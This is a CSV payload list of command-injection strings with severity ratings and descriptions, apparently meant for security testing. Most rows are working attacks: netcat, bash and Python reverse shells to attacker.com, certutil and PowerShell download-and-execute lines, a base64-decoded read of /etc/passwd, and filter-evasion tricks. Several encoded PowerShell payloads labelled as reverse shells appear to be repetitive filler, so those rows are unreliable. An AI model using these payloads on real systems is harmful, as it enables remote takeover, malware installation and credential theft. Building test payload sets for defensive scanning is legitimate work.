id,attack_class,payload,type,severity,context,description,example
cmdinj-084,cmdi,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection,high,Encoded PowerShell payload,Windows cmd injection with powershell encoded command,
cmdinj-085,cmdi,; nc attacker.com 4444 -e /bin/bash,Command Injection,critical,Reverse shell via netcat,macOS/Linux injection with semicolon and nc reverse shell,
cmdinj-086,cmdi,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Command Injection,critical,Download and execute file,Windows cmd injection with certutil download,
cmdinj-087,cmdi,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Command Injection,critical,Reverse shell via bash,macOS/Linux injection with semicolon and bash reverse shell,
cmdinj-088,cmdi,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Command Injection,critical,Download and execute PowerShell script,Windows PowerShell injection with Invoke-WebRequest,
cmdinj-089,cmdi,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Command Injection,critical,Reverse shell via python,macOS/Linux injection with semicolon and python reverse shell,
cmdinj-090,cmdi,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==,Command Injection,critical,Encoded PowerShell reverse shell,Windows cmd injection with powershell encoded reverse shell,
cmdinj-091,cmdi,; e${IFS}cho injected,Command Injection,high,Bypass simple filters using ${IFS} (space) variable,Obfuscated command injection using environment variable concatenation,
cmdinj-093,cmdi,%253B%2520id,Command Injection,high,Double URL encoded semicolon and id,Command injection with double URL encoding,
cmdinj-094,cmdi,; VAR=whoami; $VAR,Command Injection,high,Use variable to execute command,Command injection using variable substitution and command chaining,
cmdinj-095,cmdi,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Command Injection,critical,Decode and execute base64 payload,Command injection using nested base64 decoding and execution,
cmdinj-096,cmdi,"&& echo injected
id",Command Injection,high,Use newline as command separator,Command injection using less common command separator (newline),
cmdinj-097,cmdi,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection,critical,Obfuscated PowerShell encoded command,Command injection using PowerShell encoded command with obfuscation,
cmdinj-098,cmdi,"; echo $(echo ""$(whoami)"")",Command Injection,high,Nested command substitution with quotes,Command injection using command substitution with nested quotes,
cmdinj-099,cmdi,; export CMD=whoami; ${CMD},Command Injection,high,Indirect command execution via env var,Command injection using environment variable and indirect expansion,
